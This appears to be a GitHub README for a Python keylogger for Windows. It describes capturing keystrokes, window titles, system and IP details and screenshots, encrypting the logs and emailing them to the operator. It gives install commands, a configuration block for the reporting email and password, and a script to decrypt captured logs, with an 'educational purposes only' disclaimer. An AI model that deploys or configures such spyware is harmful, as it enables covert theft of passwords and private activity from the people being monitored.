# Advanced Python Key Logger

A robust key logger built for cybersecurity research and educational purposes. This version includes advanced features like system information gathering, screenshots, active window logging, log encryption, and email reporting.

## ⚠️ Disclaimer

**This tool is for educational purposes only.**
Unauthorized use of key loggers is illegal and unethical. Ensure you have explicit permission from the device owner before running this software. The author is not responsible for any misuse.

## Features

- **Keystroke Logging**: Captures all keys pressed.
- **Active Window Logging**: Records the window title where the keys were pressed.
- **System Information**: Logs IP, Hostname, Processor, and System details on startup.
- **Screenshots**: Captures screenshots at set intervals.
- **Encryption**: Logs are encrypted using Fernet (symmetric encryption).
- **Email Reporting**: Sends logs and screenshots to your email.

## Prerequisites

- Python 3.x
- Windows OS (for `pywin32` support)

## Installation

1. Clone the repository:

    ```bash
    git clone https://github.com/joemunene-by/Key-logger.git
    cd Key-logger
    ```

2. Install dependencies:

    ```bash
    pip install -r requirements.txt
    ```

## Usage

1. **Configuration**:
    Open `main.py` and edit the `KeyLogger` instantiation at the bottom of the file:

    ```python
    keylogger = KeyLogger(
        time_interval=600,         # Report interval in seconds
        email="your_email@gmail.com", 
        password="your_email_password" # Use App Password for Gmail
    )
    ```

2. **Run the script**:

    ```bash
    python main.py
    ```

3. **Logs**:
    - `keylog.enc`: Encrypted keystroke logs.
    - `screenshot_*.png`: Captured screenshots.
    - `key.key`: The encryption key (KEEP THIS SAFE to decrypt your logs!).

## Decrypting Logs

To read `keylog.enc`, you will need to write a small script using the generated `key.key`:

```python
from cryptography.fernet import Fernet

with open("key.key", "rb") as k:
    key = k.read()

cipher = Fernet(key)

with open("keylog.enc", "rb") as f:
    encrypted_data = f.read()

print(cipher.decrypt(encrypted_data).decode())
```
